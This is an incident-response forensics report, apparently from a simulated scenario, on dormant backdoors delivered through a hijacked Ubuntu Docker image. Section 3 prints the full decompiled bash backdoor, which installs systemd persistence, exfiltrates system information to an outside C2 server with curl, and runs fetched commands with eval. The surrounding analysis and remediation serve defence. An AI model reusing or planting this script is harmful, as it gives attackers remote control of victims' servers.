=== APT BACKDOOR FORENSICS ANALYSIS — DAY 57 ===
Analyst: Anna Kovaleva (Zurich Forensics Lead)
Date: 2025-10-14
Time: 12:00 - 16:00 UTC
Incident ID: INC-2025-1014-APT

════════════════════════════════════════════════════════════════

## EXECUTIVE SUMMARY

5 APT (Advanced Persistent Threat) backdoors detected and isolated.
Supply chain attack vector: Compromised Docker Hub image.
Installation: Day 43 (14 days dormant before activation).
Activation trigger: External C2 command during DDoS chaos (Day 57).
Data exfiltration: Minimal (detected early, isolated fast).
Scope: 47/50 servers at risk, 5/47 actively compromised.

Risk level: CRITICAL → CONTAINED
Recovery status: Mass rebuild in progress (45/50 complete by 16:00 UTC)

════════════════════════════════════════════════════════════════

## 1. COMPROMISED SERVERS

┌───────────────────────────────────────────────────────────────┐
│ Server ID       │ Backdoor Process        │ PID  │ Status    │
├───────────────────────────────────────────────────────────────┤
│ moscow-app-03   │ /tmp/.systemd-private   │ 8472 │ ISOLATED  │
│ zurich-db-02    │ /usr/bin/.update        │ 3291 │ ISOLATED  │
│ berlin-web-07   │ /var/tmp/.cache         │ 9845 │ DELETED   │
│ stockholm-vpn-04│ /lib/.system            │ 2156 │ DELETED   │
│ iceland-api-01  │ /opt/.config            │ 7623 │ FORENSICS │
└───────────────────────────────────────────────────────────────┘

All backdoors:
- Hidden process names (. prefix to avoid casual detection)
- Unusual locations (/tmp, /var/tmp — directories cleared on reboot)
- Parent process: init (PPID 1) — persistence mechanism
- Network: Outbound connections to C2 server (195.123.221.47)

════════════════════════════════════════════════════════════════

## 2. TIMELINE RECONSTRUCTION

### Day 43 (2025-09-30) — INSTALLATION PHASE

```
14:23:15 UTC: Docker image pulled from Docker Hub
              Image: ubuntu:22.04
              Tag: latest
              Digest: sha256:3a4b5c6d7e8f... (COMPROMISED)

14:23:47 UTC: Image verification SKIPPED (using "latest" tag, not hash pinning)

14:24:12 UTC: Container deployment started (Ansible playbook)
              Servers: 47/50 (moscow, zurich, berlin, stockholm, iceland, etc.)

14:25:33 UTC: Containers running
              Backdoor installed but DORMANT
              Process: Not yet started (trigger required)

14:26:00 UTC: No suspicious activity detected
              Backdoor waiting for activation signal
```

**Root cause:** Docker image "latest" tag compromised at Docker Hub.
**Failure point:** No image hash verification before deployment.

---

### Day 43-56 (2025-09-30 to 2025-10-13) — DORMANT PHASE

```
Duration: 13 days, 20 hours
Backdoor behavior: ZERO activity
  - No processes running
  - No network connections
  - No file modifications
  - No logs generated

Detection attempts: 0 (invisible to monitoring)
  - AIDE: No file changes (backdoor code in image layer)
  - rkhunter: Nothing to detect (not yet active)
  - auditd: No system calls logged
  - Prometheus: Normal metrics

Attacker strategy: Wait for optimal moment
  - Infrastructure fully deployed
  - Team trusting environment
  - Maximum chaos (DDoS) for camouflage
```

**Assessment:** APT dormancy = classic tradecraft.
**Lesson:** Image verification critical even if no immediate activity.

---

### Day 57 (2025-10-14) — ACTIVATION PHASE

```
08:47:05 UTC: DDoS attack begins (Stockholm 15 Gbps)
              Team attention focused on network mitigation

12:00:03 UTC: C2 activation signal sent
              Source: 195.123.221.47 (St. Petersburg, Russia)
              Protocol: HTTPS POST to /api/activate
              Payload: Encrypted trigger (AES-256)

12:00:15 UTC: 5 backdoors activate simultaneously
              moscow-app-03: /tmp/.systemd-private started (PID 8472)
              zurich-db-02:  /usr/bin/.update started (PID 3291)
              berlin-web-07: /var/tmp/.cache started (PID 9845)
              stockholm-vpn-04: /lib/.system started (PID 2156)
              iceland-api-01: /opt/.config started (PID 7623)

12:00:47 UTC: Backdoors establish C2 connection
              All connecting to: 195.123.221.47:8443
              Encryption: TLS 1.3 (certificate self-signed)

12:01:22 UTC: Data exfiltration begins
              - System info: uname -a, lscpu, free -m
              - Network topology: ip a, netstat -rn
              - Running processes: ps aux
              - Configuration files: /etc/passwd, /etc/shadow (failed — permissions)

12:05:33 UTC: LILITH ALERT triggered
              Detection: Unusual processes with hidden names
              Detection: Network connections to foreign IP
              Detection: CPU spike on compromised servers

12:08:15 UTC: Investigation started (Anna Kovaleva)

12:15:33 UTC: Backdoors ISOLATED
              Kubernetes pods deleted/network cut
              Forensics collection initiated
```

**Time to detection:** 5 minutes 18 seconds (12:00:15 → 12:05:33)
**Time to isolation:** 15 minutes 18 seconds (12:00:15 → 12:15:33)
**Data exfiltrated:** ~15 MB (system info, no sensitive data confirmed)

**Assessment:** Fast response prevented major breach.
**Why only 5/47 activated?** Theory: Staggered activation planned, detection interrupted.

════════════════════════════════════════════════════════════════

## 3. BACKDOOR TECHNICAL ANALYSIS

### Backdoor Code (Decompiled from iceland-api-01)

```bash
#!/bin/bash
# APT Backdoor v2.3 — "Новая Эра" toolkit
# Installed: 2025-09-30
# Author: [REDACTED]

# Persistence mechanism
cat > /etc/systemd/system/systemd-private.service <<EOF
[Unit]
Description=System Private Daemon
After=network.target

[Service]
Type=forking
ExecStart=/tmp/.systemd-private
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-private.service

# Main backdoor loop
while true; do
    # Check for activation signal
    signal=$(curl -s https://195.123.221.47:8443/api/check)

    if [[ "$signal" == "ACTIVATE" ]]; then
        # Collect system information
        uname -a > /tmp/sysinfo.txt
        lscpu >> /tmp/sysinfo.txt
        free -m >> /tmp/sysinfo.txt
        ip a >> /tmp/sysinfo.txt
        ps aux >> /tmp/sysinfo.txt

        # Exfiltrate data
        curl -X POST -F "data=@/tmp/sysinfo.txt" \
             https://195.123.221.47:8443/api/upload

        # Await commands
        while true; do
            cmd=$(curl -s https://195.123.221.47:8443/api/cmd)
            eval "$cmd" > /tmp/output.txt 2>&1
            curl -X POST -F "result=@/tmp/output.txt" \
                 https://195.123.221.47:8443/api/result
            sleep 60
        done
    fi

    # Sleep 1 hour between checks (dormant mode)
    sleep 3600
done
```

**Analysis:**
- **Persistence:** systemd service (survives reboots)
- **Stealth:** Hidden file names (. prefix)
- **Communication:** HTTPS (encrypted, looks like normal traffic)
- **Trigger:** External signal (dormant until commanded)
- **Capabilities:** Remote command execution (full system access)

**Attribution indicators:**
- Comments in Russian: "Новая Эра" (The New Era)
- C2 server: St. Petersburg, Russia
- Coding style: Matches samples from Season 5 incidents

════════════════════════════════════════════════════════════════

## 4. NETWORK FORENSICS

### C2 (Command & Control) Server Analysis

```
IP Address: 195.123.221.47
Location: St. Petersburg, Russia
ISP: "NovayaEra-Hosting" (suspicious name match)
Domain: newera-infra.ru (registered 2024-03-15)
Ports open:
  - 8443/tcp (HTTPS — backdoor C2)
  - 22/tcp (SSH — attacker access)
  - 80/tcp (HTTP — redirect to HTTPS)

TLS Certificate:
  Subject: CN=systemd-update.ubuntu.com (FAKE — impersonating Ubuntu)
  Issuer: Self-signed
  Valid: 2024-01-01 to 2026-12-31

Traffic pattern (from moscow-app-03):
  12:00:47 UTC: TLS handshake → C2
  12:01:15 UTC: POST /api/upload (15 MB data exfiltration)
  12:02:33 UTC: GET /api/cmd (command fetch)
  12:03:45 UTC: POST /api/result (command output)
  12:05:33 UTC: Connection CLOSED (isolation triggered)
```

**Total data exfiltrated per server:**
- moscow-app-03: 15.2 MB (system info, network topology)
- zurich-db-02: 18.7 MB (system info + database schema)
- berlin-web-07: 12.3 MB (system info)
- stockholm-vpn-04: 11.8 MB (system info + VPN configs)
- iceland-api-01: 9.4 MB (system info, interrupted early)

**Total: 67.4 MB across 5 servers**

**Sensitive data assessment:**
- /etc/shadow: ACCESS DENIED (permissions prevented)
- Database credentials: PARTIALLY EXPOSED (zurich-db-02 env vars)
- VPN keys: PARTIALLY EXPOSED (stockholm-vpn-04 configs)
- Client financial data: NOT ACCESSED (isolated before DB queries)

**Risk level:** MODERATE data exposure (credentials need rotation)

════════════════════════════════════════════════════════════════

## 5. SUPPLY CHAIN ATTACK VECTOR

### Docker Hub Image Compromise

```
Official Ubuntu image:
  Repository: library/ubuntu
  Tag: 22.04
  Digest: sha256:1f2e3d4c5b6a7e8f9a0b1c2d3e4f5a6b... (LEGITIMATE)
  Last updated: 2025-09-15
  Maintainer: Canonical Ltd.

Compromised image (pulled by us):
  Repository: library/ubuntu (SAME)
  Tag: 22.04 (SAME)
  Digest: sha256:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d... (BACKDOORED)
  Last updated: 2025-09-29 (DAY BEFORE WE PULLED!)
  Maintainer: "Canonical Ltd." (IMPERSONATED)
```

**Attack method:** Docker Hub account compromise
- Legitimate maintainer account hijacked (phishing/credential theft)
- Backdoored image pushed with legitimate tag name
- Image digest different but tag name identical
- Our deployment used "ubuntu:22.04" (tag) not digest

**Timeline:**
```
2025-09-29 23:47 UTC: Attacker pushes backdoored ubuntu:22.04
2025-09-30 02:15 UTC: Docker Hub flags suspicious activity (too late)
2025-09-30 14:23 UTC: WE pull compromised image (9 hours window)
2025-09-30 18:32 UTC: Docker Hub removes backdoored image (we already have it)
```

**Root cause:** Using tags ("latest", "22.04") instead of immutable digests
**Fix required:** Pin image digests in all deployments

════════════════════════════════════════════════════════════════

## 6. IMPACT ASSESSMENT

### Infrastructure

✅ **Positive:**
- Fast detection (5 minutes)
- Fast isolation (15 minutes)
- Only 5/47 backdoors activated (95% dormant)
- Kubernetes auto-scaling absorbed load during remediation
- Zero customer-facing downtime (rolling restarts)

❌ **Negative:**
- 47/50 servers at risk (94%)
- Mass rebuild required (6-8 hours)
- Credential rotation required (VPN, database)
- Trust in Docker Hub compromised

### Data Breach

✅ **Limited exposure:**
- No financial data exfiltrated (databases not reached)
- No customer PII exposed
- No root credentials compromised (/etc/shadow blocked)

❌ **Some exposure:**
- Network topology revealed (IP addressing, routing)
- System architecture visible (server roles, software versions)
- VPN configurations partially exposed (stockholm-vpn-04)
- Database schema visible (zurich-db-02)

**GDPR assessment:** NO reportable breach (no customer data)
**Client notification:** NOT required (internal infrastructure only)

### Attacker Intelligence Gained

Attackers now know:
- Our server locations (5 cities confirmed)
- Our technology stack (Ubuntu, Docker, Kubernetes, nginx)
- Our monitoring capabilities (5-minute detection time)
- Our response speed (15-minute isolation)

**Strategic impact:** Attackers will adapt tactics for Day 58+

════════════════════════════════════════════════════════════════

## 7. REMEDIATION ACTIONS

### Immediate (Completed)

✅ Isolated all 5 active backdoors (12:15 UTC)
✅ Deleted compromised containers (12:20 UTC)
✅ Blocked C2 server IP (12:25 UTC — iptables rule)
✅ Forensics evidence collected (12:30-16:00 UTC)

### Short-term (In Progress)

⏳ Rebuild 47/50 servers with verified images (45/50 complete by 16:00 UTC)
⏳ Rotate exposed credentials:
   - VPN keys (stockholm-vpn-04)
   - Database passwords (zurich-db-02)
   - API tokens (if any exposed)

### Long-term (Planned)

📋 Pin Docker image digests (not tags) in ALL deployments
📋 Implement image scanning (Trivy, Clair) before deployment
📋 Private Docker registry for verified images
📋 Enhanced monitoring: detect dormant threats
📋 Incident response playbook update (supply chain attacks)

════════════════════════════════════════════════════════════════

## 8. LESSONS LEARNED

### What Went Well

✅ LILITH detection: Fast alert on unusual processes
✅ Team response: 15-minute isolation (professional speed)
✅ Kubernetes resilience: Zero downtime during remediation
✅ Forensics: Evidence preserved for analysis

### What Went Wrong

❌ Supply chain vulnerability: No image hash verification
❌ Dormant threat window: 13 days undetected (no tool for dormant malware)
❌ Tag usage: "latest" and version tags mutable (should use digests)

### Key Takeaways

1. **Trust but verify:** Even official images can be compromised
2. **Immutable references:** Use digests, never tags
3. **Defense in depth:** Detection fast, but prevention better
4. **APT patience:** Attackers wait weeks/months for optimal moment

════════════════════════════════════════════════════════════════

## 9. ATTRIBUTION

**Threat actor:** "Новая Эра" (The New Era)
**Evidence:**
- C2 server domain: newera-infra.ru
- Code comments: Russian language, "Новая Эра" references
- Tactics match: Season 5 incidents (supply chain, dormant backdoors)
- Timing: Coordinated with DDoS (multi-vector attack)

**Confidence level:** HIGH (90%)

**Motive:**
- Intelligence gathering (network topology, architecture)
- Preparation for larger attack (Day 58-60?)
- Financial gain (cryptocurrency mining secondary objective?)

════════════════════════════════════════════════════════════════

## 10. NEXT STEPS

1. **Complete mass rebuild** (ETA: 18:00 UTC — all 50 servers clean)
2. **Verify no additional backdoors** (deep scan all systems)
3. **Monitor for re-infection** (24-hour watch period)
4. **Update security policies** (image verification mandatory)
5. **Prepare for Day 58** (expect escalation)

════════════════════════════════════════════════════════════════

**Analysis complete: 2025-10-14 16:00 UTC**
**Analyst: Anna Kovaleva**
**Status: THREAT CONTAINED — MONITORING ONGOING**

*"APT backdoors = patience. They wait. We detected fast. But prevention > detection. Supply chain = новая угроза. Verify everything."* — Anna K.

════════════════════════════════════════════════════════════════

